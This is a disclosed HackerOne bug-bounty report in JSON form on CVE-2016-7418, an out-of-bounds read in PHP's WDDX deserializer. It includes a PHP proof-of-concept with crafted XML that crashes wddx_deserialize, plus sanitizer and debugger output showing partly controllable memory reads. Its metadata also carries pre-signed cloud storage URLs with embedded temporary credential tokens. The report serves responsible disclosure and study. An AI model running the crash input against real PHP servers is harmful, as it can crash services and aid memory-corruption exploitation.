{
  "id": 170618,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNzA2MTg=",
  "url": "https://hackerone.com/reports/170618",
  "title": "CVE-2016-7418 PHP Out-Of-Bounds Read in php_wddx_push_element",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2016-09-20T02:33:52.954Z",
  "submitted_at": "2016-09-20T02:33:52.954Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "binvul",
    "url": "/binvul",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 54349,
    "url": "https://hackerone.com/ibb",
    "handle": "ibb",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4DN4LTGY%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T085136Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICihLzHOdlSADeEpichrXt3bf6LTV5r9gNhRnZAQ7aR8AiBKR1Qv26nbfUEM8r1Rp2Vc9GLkWFTy%2FTqxu30gCBgy5yq7BQj9%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMiygkKuZi%2FsZvWlo2Ko8F6xjBVQbkdUd%2FhfhLOLS93Kb4P4nZMPGNAI5IAK89FQYNjAJzlsofB%2BhOxQRUt%2FAoA5oC7nhedr1rj5%2Fos7eOKh0jdrihAOKC32gvm84ad8WG48haE2VGPe1cXFpdR7KkRxOFMCW522Us3ipahWg5bCq94aM41c5HfjyHUoh9uqSroW9zJ%2FFaxIdK22%2BSw2uipc7R2k5mVqLi4T2mXpeZLddKvXN88iMvgbl4AtQj%2FBRfd4HazynTw6Qk8H0BYdgeRT1VMvBsyaxhqauI0375rOPEQks8%2BvFiBQFUdrZPy7BHSE%2B3eNDSImJh57o%2BqDLSBIpIv3%2BBCo%2BoX30B%2FdgKfvcAaK1g%2Bd3VGrbGF9ZJFOJRD3sHx4c2WkxDAZnY%2Bt66PxlTH%2Fu1qA%2FQ3ne3Lx37WOM0aPd8uuTVLeyFJZknltaex%2Bt3eUeboXnE5qgoyNVqNwJUdhudBZMVl3crMxd03MJxJTsvXpPZbqlDO%2B2VFUDdguQhBEkbUFHsT%2B1TP8ZzorxElNefOEmrdaJ%2B1uia%2BpzmUZq9b4Cl9dqTu0gjvdCEV0NJOW4OSa2xoHdq48LLTZJztij2QEb2DapFwIR3mwuMMicCcH8cZP704to7L%2FiF879GIRD21MLME1iTjuQJHCYix6VwjYk450HuKP3jdgNaSNwTks26LMvV%2FTcWo8C3%2BSNt5GUIOnI%2B7ZgvyVH0JWqCoxCL4fsrXqayBxRUVb3rzf9aLdkEROJm9ACoDNrOG1gFnm8c9RaI%2FThxJaMmYWuDTNEpX2gSEimhnOrD%2FgPOFC160582KLdSFyNb9p7%2FfHaCT6M0Hgpn1IlFfobFTvByP5ZSOYX7OFu2jhkCNyk88Uxgz6%2BwZNdeZvC%2BQjCQ8r3GBjqyAcBPGh29i5hcRNaDGazFaDRXfDximEQpFnSPbR8DkZcFWg%2Bz7YxJTqkmP8Q8fBlgq5JKpMlpgDSMKM2gYltBa93P4kzhCu569ev9olUyqR4%2FFRn47H%2F%2BpB%2BjXco8pc43i3ShVgw8DSAjI8iveajihwjdjO5A1ceLnRjXC2kxKe1hjwHUe0kztYdqydEvmfdRqub64sI0vHdZ7IPdN3eLGQ4Qm099%2F8asWtc9QJvekpJYPBg%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=6f906209b6ac4d6605baf07c104a14027f740904342a94f8fb17182c337a6416",
      "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4DN4LTGY%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T085136Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIT%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICihLzHOdlSADeEpichrXt3bf6LTV5r9gNhRnZAQ7aR8AiBKR1Qv26nbfUEM8r1Rp2Vc9GLkWFTy%2FTqxu30gCBgy5yq7BQj9%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMiygkKuZi%2FsZvWlo2Ko8F6xjBVQbkdUd%2FhfhLOLS93Kb4P4nZMPGNAI5IAK89FQYNjAJzlsofB%2BhOxQRUt%2FAoA5oC7nhedr1rj5%2Fos7eOKh0jdrihAOKC32gvm84ad8WG48haE2VGPe1cXFpdR7KkRxOFMCW522Us3ipahWg5bCq94aM41c5HfjyHUoh9uqSroW9zJ%2FFaxIdK22%2BSw2uipc7R2k5mVqLi4T2mXpeZLddKvXN88iMvgbl4AtQj%2FBRfd4HazynTw6Qk8H0BYdgeRT1VMvBsyaxhqauI0375rOPEQks8%2BvFiBQFUdrZPy7BHSE%2B3eNDSImJh57o%2BqDLSBIpIv3%2BBCo%2BoX30B%2FdgKfvcAaK1g%2Bd3VGrbGF9ZJFOJRD3sHx4c2WkxDAZnY%2Bt66PxlTH%2Fu1qA%2FQ3ne3Lx37WOM0aPd8uuTVLeyFJZknltaex%2Bt3eUeboXnE5qgoyNVqNwJUdhudBZMVl3crMxd03MJxJTsvXpPZbqlDO%2B2VFUDdguQhBEkbUFHsT%2B1TP8ZzorxElNefOEmrdaJ%2B1uia%2BpzmUZq9b4Cl9dqTu0gjvdCEV0NJOW4OSa2xoHdq48LLTZJztij2QEb2DapFwIR3mwuMMicCcH8cZP704to7L%2FiF879GIRD21MLME1iTjuQJHCYix6VwjYk450HuKP3jdgNaSNwTks26LMvV%2FTcWo8C3%2BSNt5GUIOnI%2B7ZgvyVH0JWqCoxCL4fsrXqayBxRUVb3rzf9aLdkEROJm9ACoDNrOG1gFnm8c9RaI%2FThxJaMmYWuDTNEpX2gSEimhnOrD%2FgPOFC160582KLdSFyNb9p7%2FfHaCT6M0Hgpn1IlFfobFTvByP5ZSOYX7OFu2jhkCNyk88Uxgz6%2BwZNdeZvC%2BQjCQ8r3GBjqyAcBPGh29i5hcRNaDGazFaDRXfDximEQpFnSPbR8DkZcFWg%2Bz7YxJTqkmP8Q8fBlgq5JKpMlpgDSMKM2gYltBa93P4kzhCu569ev9olUyqR4%2FFRn47H%2F%2BpB%2BjXco8pc43i3ShVgw8DSAjI8iveajihwjdjO5A1ceLnRjXC2kxKe1hjwHUe0kztYdqydEvmfdRqub64sI0vHdZ7IPdN3eLGQ4Qm099%2F8asWtc9QJvekpJYPBg%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b3ad5fe8476ad98396fa05fb48d383d308bf10e8710cef09589c4859c21e55c6"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Internet Bug Bounty",
      "twitter_handle": "",
      "website": "https://www.hackerone.com/internet-bug-bounty",
      "about": "The Internet Bug Bounty rewards security research into vulnerabilities impacting Open Source Software Projects."
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2016-7418"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2020-10-10T01:50:19.652Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2020-10-10T01:50:15.000Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "# CVE-2016-7418 PHP Out-Of-Bounds Read in php_wddx_push_element\n\n## 1. Affected Version\n+ PHP 7.0.10\n+ PHP 5.6.25\n\n## 2. Credit\nThis vulnerability was discovered by Ke Liu of Tencent's Xuanwu LAB.\n\n## 3. Testing Environments\n+ **OS**: Ubuntu\n+ **PHP**: [7.0.10](http://php.net/distributions/php-7.0.10.tar.gz)\n+ **Compiler**: Clang\n+ **CFLAGS**: ``-g -O0 -fsanitize=address``\n\n## 4. PoC\nThere are **five** similar issues in function ``php_wddx_push_element``, but I'll just demonstrate one issue here. More proof-of-concept files are available at [PHP BUG 73065](https://bugs.php.net/bug.php?id=73065).\n\n```\n<?php\n    $xml = <<<XML\n<?xml version='1.0' ?>\n    <!DOCTYPE et SYSTEM 'w'>\n    <wddxPacket ven='1.0'>\n        <array>\n            <var Name=\"name\">\n                <boolean value=\"keliu\"></boolean>\n            </var>\n            <var name=\"1111\">\n                <var name=\"2222\">\n                    <var name=\"3333\"></var>\n                </var>\n            </var>\n        </array>\n    </wddxPacket>\nXML;\n    \n    $array = wddx_deserialize($xml);\n    var_dump($array);\n?>\n```\n\n## 5. Vulnerability Details\n\nAddressSanitizer output the following exception information.\n\n```\n==47769==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 \n    (pc 0x00000046fb9c bp 0x7ffc278e29b0 sp 0x7ffc278e2130 T0)\n    #0 0x46fb9b in __interceptor_strcmp.part.24 (php-src/sapi/cli/php+0x46fb9b)\n    #1 0xac41d4 in php_wddx_push_element php-src/ext/wddx/wddx.c:791:9\n    #2 0x7fa8715ac67f in _init (/lib/x86_64-linux-gnu/libexpat.so.1+0x867f)\n    #3 0x7fa8715ad38b in _init (/lib/x86_64-linux-gnu/libexpat.so.1+0x938b)\n    #4 0x7fa8715aecad in _init (/lib/x86_64-linux-gnu/libexpat.so.1+0xacad)\n    #5 0x7fa8715af404 in _init (/lib/x86_64-linux-gnu/libexpat.so.1+0xb404)\n    #6 0x7fa8715b170a in XML_ParseBuffer (/lib/x86_64-linux-gnu/libexpat.so.1+0xd70a)\n    #7 0xac1717 in php_wddx_deserialize_ex php-src/ext/wddx/wddx.c:1081:2\n    #8 0xabad7a in zif_wddx_deserialize php-src/ext/wddx/wddx.c:1299:2\n    #9 0xfdfb3d in ZEND_DO_ICALL_SPEC_RETVAL_USED_HANDLER php-src/Zend/zend_vm_execute.h:675:2\n    #10 0xe75f4b in execute_ex php-src/Zend/zend_vm_execute.h:432:7\n    #11 0xe76ec3 in zend_execute php-src/Zend/zend_vm_execute.h:474:2\n    #12 0xd00e9e in zend_execute_scripts php-src/Zend/zend.c:1464:4\n    #13 0xad4425 in php_execute_script php-src/main/main.c:2537:14\n    #14 0x10fca26 in do_cli php-src/sapi/cli/php_cli.c:990:5\n    #15 0x10f9f60 in main php-src/sapi/cli/php_cli.c:1378:18\n    #16 0x7fa86fec582f in __libc_start_main /build/glibc-GKVZIf/glibc-2.23/csu/../csu/libc-start.c:291\n    #17 0x449578 in _start (php-src/sapi/cli/php+0x449578)\n\nAddressSanitizer can not provide additional info.\nSUMMARY: AddressSanitizer: SEGV (php-src/sapi/cli/php+0x46fb9b) in __interceptor_strcmp.part.24\n==47769==ABORTING\n```\n\nAddressSanitizer indicates that this is a NULL pointer dereference issue. However, if we debug it under GDB, we'll find out that this can be a Out-Of-Bounds read issue.\n\n```\n(gdb) n\nProgram received signal SIGSEGV, Segmentation fault.\n__strcmp_sse2_unaligned () at ../sysdeps/x86_64/multiarch/strcmp-sse2-unaligned.S:31\n31\t../sysdeps/x86_64/multiarch/strcmp-sse2-unaligned.S: No such file or directory.\n\n(gdb) x/i $rip\n=> 0x7ffff6da1b5a <__strcmp_sse2_unaligned+26>:\tmovdqu (%rdi),%xmm1\n\n(gdb) i r $rdi\nrdi            0x74656b6361507801\t8387227955626014721\n\n(gdb) x/20xb $rdi\n0x74656b6361507801:\tCannot access memory at address 0x74656b6361507801\n```\n\nTo some degree, the value of ``rdi`` register can be controlled. For example, value ``0x74656b6361507801`` can be expressed as ``\\x01xPacket``. This can be controlled in the XML code in the proof-of-concept file.\n\n```\n>>> '74656b6361507801'.decode('hex')[::-1]\n'\\x01xPacket'\n```\n\n# 6. Source Code Analysis\nThe code lead to this issue is listed as follows.\n\n```\n790  if (atts) for (i = 0; atts[i]; i++) {\n791      if (!strcmp((char *)atts[i], EL_NAME) && atts[++i] && atts[i][0]) {\n792          if (stack->varname) efree(stack->varname);\n793          stack->varname = estrdup((char *)atts[i]);\n794          break;\n795      }\n796  }\n```\n\nTesting data to trigger this issue is listed as follows.\n\n```\natts[0] = 0x0000000000cf8699  \"Name\"\natts[1] = 0x0000000000cf783c  \"name\"   EL_NAME\natts[2] = 0x0000000000000000  NULL\natts[3] = 0x74656b6361507801  ????\n```\n\nHere ``atts[2]`` was not checked in the ``for`` loop but in the ``if`` statement (checked when evaluating ``atts[++i]``). So when entering the ``if`` statement next time, ``strcmp(atts[3], EL_NAME)`` would cause an Out-Of-Bounds read issue.\n\n## 7. Timeline\n+ 2016.09.12 - Found\n+ 2016.09.12 - Reported to PHP via [73065](https://bugs.php.net/bug.php?id=73065)\n+ 2016.09.12 - Fixed\n+ 2016.09.15 - Assigned CVE-2016-7418\n+ 2016.09.15 - [PHP 7.0.10](http://www.php.net/ChangeLog-7.php#7.0.11) and [PHP 5.6.25](http://www.php.net/ChangeLog-5.php#5.6.26) Released\n",
  "weakness": {
    "id": 2,
    "name": "Memory Corruption - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2020-11-09T01:50:15.137Z",
  "allow_singular_disclosure_after": -153558081.09368792,
  "singular_disclosure_allowed": true,
  "vote_count": 5,
  "voters": [
    "mik317",
    "official_blackhat13",
    "dyabla",
    "bittaken",
    "merc29"
  ],
  "structured_scope": {
    "databaseId": 84120,
    "asset_type": "OTHER",
    "asset_identifier": "PHP",
    "max_severity": "none"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
